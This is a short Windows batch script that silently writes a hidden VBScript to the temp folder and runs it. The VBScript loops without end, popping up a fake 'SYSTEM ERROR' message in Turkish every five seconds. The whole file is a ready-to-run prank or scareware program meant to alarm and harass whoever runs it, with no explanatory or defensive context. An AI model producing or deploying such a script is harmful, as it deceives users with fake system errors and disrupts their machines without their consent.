@echo off
if exist "%temp%\gizli.vbs" del "%temp%\gizli.vbs"
echo Set WshShell = CreateObject("WScript.Shell")>> "%temp%\gizli.vbs"
echo Do>> "%temp%\gizli.vbs"
echo WshShell.Run "mshta ""vbscript:MsgBox(""ERROR! Sistemde kritik bir hata olustu!"",16,""SYSTEM ERROR"")(window.close)""", 0, False>> "%temp%\gizli.vbs"
echo WScript.Sleep 5000>> "%temp%\gizli.vbs"
echo Loop>> "%temp%\gizli.vbs"
start "" wscript.exe "%temp%\gizli.vbs"
exit